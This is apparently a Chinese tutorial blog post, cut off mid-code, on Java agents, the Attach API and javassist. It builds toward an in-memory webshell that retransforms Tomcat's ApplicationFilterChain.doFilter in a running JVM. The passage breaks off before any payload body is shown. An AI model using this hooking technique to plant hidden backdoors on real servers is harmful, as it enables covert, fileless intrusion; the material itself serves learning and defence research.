<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title">list</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title">attach</span><span class="params">(String id)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">detach</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String agent)</span> </span>&#123; ... &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其中list()返回的是一个<code>VirtualMachineDescriptor</code>列表,<code>VirtualMachineDescriptor</code>类其中的成员有下面几个,id应该是jvm对应的pid</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426115600828.png" alt="image-20220426115600828"></p>
<p>所以在使用attach方法前先使用list获取到id</p>
<p>所以大体操作方法还是和premain的差不多,还是通过artifacts-&gt;build打包成jar</p>
<p>项目结构一样</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426122014335.png" alt="image-20220426122014335"></p>
<p>首先把agent打包成jar</p>
<p>写一个有agentmain方法的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello I`m agentMain!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在MF文件中加入Agent-Class即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: AgentMainTest</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后面的步骤就比premain的时候简单多了,只需要连接虚拟机,提供代理jar包路径即可运行其中的<code>agantmain</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//E:\java\rubbish\agent\out\artifacts\agent_jar\agent.jar</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptors = VirtualMachine.list();</span><br><span class="line">        String id=virtualMachineDescriptors.get(<span class="number">1</span>).id();</span><br><span class="line">        <span class="comment">//连接虚拟机</span></span><br><span class="line">        VirtualMachine vm=VirtualMachine.attach(id);</span><br><span class="line">        <span class="comment">//提供代理jar包路径</span></span><br><span class="line">        vm.loadAgent(<span class="string">&quot;E:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar&quot;</span>);</span><br><span class="line">        vm.detach();</span><br><span class="line">        System.out.println(<span class="string">&quot;ends-------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有个问题,就是jvm的id需要小猜一下</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426164713688.png" alt="image-20220426164713688"></p>
<h3 id="instrumentation"><a href="#instrumentation" class="headerlink" title="instrumentation"></a>instrumentation</h3><p><code>instrumentation</code>是<code>JVMTIAgent</code> (JVM Tool Interface Agent)的一部分,Java agent通过这个类和目标JVM进行交互,从而达到修改数据的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class\[\] getAllLoadedClasses();</span><br><span class="line">    ......&#125;</span><br></pre></td></tr></table></figure>

<h5 id="getAllloadedClasses和isModifiableClass"><a href="#getAllloadedClasses和isModifiableClass" class="headerlink" title="getAllloadedClasses和isModifiableClass"></a>getAllloadedClasses和isModifiableClass</h5><p>修改agentmain,在其中添加<code>getAllloadedClasses</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Class[] classes=instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span>(Class aclass: classes)&#123;</span><br><span class="line">            System.out.println(aclass.getName()+<span class="string">&quot;\tModifiable==&gt;&quot;</span>+(instrumentation.isModifiableClass(aclass)?<span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426165933108.png" alt="image-20220426165933108"></p>
<h5 id="addTransformer-和retransformClasses"><a href="#addTransformer-和retransformClasses" class="headerlink" title="addTransformer()和retransformClasses()"></a>addTransformer()和retransformClasses()</h5><p>在addTransformer()中的参数<code>ClassFileTransformer transformer</code>可以帮助我们完成修改字节码的工作</p>
<p>这是一个接口,提供了一个<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">byte</span>\[\]</span><br><span class="line">    transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="keyword">byte</span>\[\]              classfileBuffer) &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="comment">/*使用Instrumentation.addTransformer()来加载一个转换器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>现在有了修改Class字节码的方法,还缺少一个工具<code>javassist</code></p>
<h4 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h4><blockquote>
<p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。</p>
<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。</p>
<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
</blockquote>
<h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p>这个类是javassist的核心组件之一</p>
<p>简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。</strong></p>
<p><code>cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</code></p>
<h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>可以把它理解成加强版的Class对象,需要从ClassPool中获得</p>
<p>获得方法<code>CtClass cc=cp.get(ClassName)</code></p>
<h5 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h5><p>可以理解为加强版的Method对象</p>
<p>获得方法:<code>CtMethod m=cc.getDeclaredMethod(MethodName)</code></p>
<p>这个类提供了一些方法,让我们可以很方便的修改方法体</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CtMethod</span> <span class="keyword">extends</span> <span class="title">CtBehavior</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中&#125;// 父类 CtBehaviorpublic abstract class CtBehavior extends CtMember &#123;</span></span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBody</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertBefore</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertAfter</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">insertAt</span><span class="params">(<span class="keyword">int</span> lineNum, String src)</span></span>;&#125;</span><br></pre></td></tr></table></figure>

<p>传递给方法 <code>insertBefore()</code> ，<code>insertAfter()</code> 和 <code>insertAt()</code> 的 String 对象<strong>是由<code>Javassist</code> 的编译器编译的</strong>。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0, $1, $2, …</td>
<td align="left">$0 = this; $1 = args[1] …..(也就是$0代表this,$1..这些代表当前方法的参数)</td>
</tr>
<tr>
<td align="left">$args</td>
<td align="left">方法参数数组.它的类型为 Object[]</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">所有实参。例如, m($$) 等价于 m($1,$2,…)</td>
</tr>
<tr>
<td align="left">$cflow(…)</td>
<td align="left">cflow 变量</td>
</tr>
<tr>
<td align="left">$r</td>
<td align="left">返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td align="left">$w</td>
<td align="left">包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td align="left">$_</td>
<td align="left">返回值</td>
</tr>
</tbody></table>
<p>一个简单的agent例子</p>
<h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>首先看agent.jar包内的代码</p>
<h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: AgentDemo</span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TransformerDemo-java"><a href="#TransformerDemo-java" class="headerlink" title="TransformerDemo.java"></a>TransformerDemo.java</h5><p><code>ClassFileTransformer</code>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String targetClassName;</span><br><span class="line">    <span class="keyword">public</span> String targetMethodName ;</span><br><span class="line">    <span class="keyword">public</span> String targetVMClassName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformerDemo</span><span class="params">(String targetClassName, String targetMethodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.targetClassName = targetClassName;</span><br><span class="line">        <span class="keyword">this</span>.targetMethodName = targetMethodName;</span><br><span class="line">        <span class="keyword">this</span>.targetVMClassName = <span class="keyword">new</span> String(targetClassName).replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;\\/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException  &#123;</span><br><span class="line">        <span class="keyword">if</span>(!className.equals(targetVMClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;not do transform&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;do transform&quot;</span>);</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            CtClass ctc = cp.get(<span class="keyword">this</span>.targetClassName);</span><br><span class="line">            System.out.println(ctc.getName());</span><br><span class="line">            CtMethod method = ctc.getDeclaredMethod(<span class="keyword">this</span>.targetMethodName);</span><br><span class="line">            System.out.println(method.getName());</span><br><span class="line">            String source = <span class="string">&quot;&#123;System.out.println(\&quot;hello transformer\&quot;);&#125;&quot;</span>;</span><br><span class="line">            method.setBody(source);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="AgentDemo-java"><a href="#AgentDemo-java" class="headerlink" title="AgentDemo.java"></a>AgentDemo.java</h5><p>agentmain方法实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String className = <span class="string">&quot;com.test.Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String methodName = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain启动!!&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> TransformerDemo(className, methodName), <span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//这个参数一定要写true,否则new出来的transformer不能修改类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;Class&gt; needRetransformClasses = <span class="keyword">new</span> LinkedList&lt;Class&gt;();</span><br><span class="line">            Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">            <span class="keyword">for</span> (Class c : loadedClasses) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(className)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;找到要修改的类了!!!&quot;</span>);</span><br><span class="line">                    Method[] methods = c.getDeclaredMethods();</span><br><span class="line">                    <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">                        System.out.println(method.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    inst.retransformClasses(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后按照之前打包的方法打包成jar包</p>
<p>接下来是测试类代码</p>
<h5 id="Hello-java"><a href="#Hello-java" class="headerlink" title="Hello.java"></a>Hello.java</h5><p>这个类中的hello方法是要修改的目标方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Hello h1 = <span class="keyword">new</span> Hello();</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            h1.hello();</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="HelloWorld-java"><a href="#HelloWorld-java" class="headerlink" title="HelloWorld.java"></a>HelloWorld.java</h5><p>这个类是连接虚拟机启动javaagent的类</p>
<p>我在里面写了个循环遍历list,这样就不用等Hello运行之后再<code>jps -l</code>方法去寻找对应的pid了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptors = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;virtualMachineDescriptors.size();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(virtualMachineDescriptors.get(i).displayName().contains(<span class="string">&quot;Hello&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String id=virtualMachineDescriptors.get(i).id();</span><br><span class="line">                    <span class="comment">//连接虚拟机</span></span><br><span class="line">                    VirtualMachine vm=VirtualMachine.attach(id);</span><br><span class="line">                    <span class="comment">//提供代理jar包路径</span></span><br><span class="line">                    vm.loadAgent(<span class="string">&quot;H:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar&quot;</span>);</span><br><span class="line">                    vm.detach();</span><br><span class="line">                    System.out.println(<span class="string">&quot;ends----&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220426220901529.png" alt="image-20220426220901529"></p>
<h4 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h4><p>在实验过程中,出现了一个让我摸不着头脑的错误</p>
<p>经过多次尝试和su18大佬的指导,确定了问题所在</p>
<p>首先解决了昨天不能调试的问题</p>
<p>在tomcat项目(比如springMVC)的lib中引入agent.jar,然后就可以看到对应的class文件,在对应的class文件中下断点即可</p>
<p>但是无法得知getDefault方法的结果</p>
<p>使用idea的evaluate expression来运行得到报错信息,是类未找到,也就是说,没有找到对应的.calss文件,解决了好久,尝试了自己写类加载器,但是还是失败了</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220427143235362.png" alt="image-20220427143235362" style="zoom: 67%;" />



<p>最后参考了<a href="https://github.com/rebeyond/memShell">rebeyond</a>大佬的做法,将javassist.jar解压后的到的jvassist文件夹放到agent的代码同级目录一起打包成agent.jar</p>
<blockquote>
<p>打包之前,需要先删除已有的artifacts,否则会把这个javassist继续打包成jar,只需要按照最上面的设置重新整一个artifacts就行了</p>
</blockquote>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220429105814605.png" alt="image-20220429105814605"></p>
<p>这样完美解决了找不到类的问题</p>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><p>连接虚拟机启动的代码并没有变化,主要的变化在agent中</p>
<p>MANIFEST.MF文件没有变化</p>
<h5 id="AgentDemo"><a href="#AgentDemo" class="headerlink" title="AgentDemo"></a>AgentDemo</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String className = <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String methodName = <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain启动!!&quot;</span>);</span><br><span class="line">        Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Class c : loadedClasses) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(className)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;找到要修改的类了!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    inst.addTransformer(<span class="keyword">new</span> TransformerDemo(className, methodName), <span class="keyword">true</span>);</span><br><span class="line">                    inst.retransformClasses(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TransformerDemo"><a href="#TransformerDemo" class="headerlink" title="TransformerDemo"></a>TransformerDemo</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String targetClassName;</span><br><span class="line">    <span class="keyword">public</span> String targetMethodName;</span><br><span class="line">    <span class="keyword">public</span> String targetVMClassName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformerDemo</span><span class="params">(String targetClassName, String targetMethodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.targetClassName = targetClassName;</span><br><span class="line">        <span class="keyword">this</span>.targetMethodName = targetMethodName;</span><br><span class="line">        <span class="keyword">this</span>.targetVMClassName = <span class="keyword">new</span> String(targetClassName).replaceAll(<span class="string">&quot;\\.&quot;</span>, <span class="string">&quot;\\/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readTXT</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(path), <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">            StringBuffer bf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                bf.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> bf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            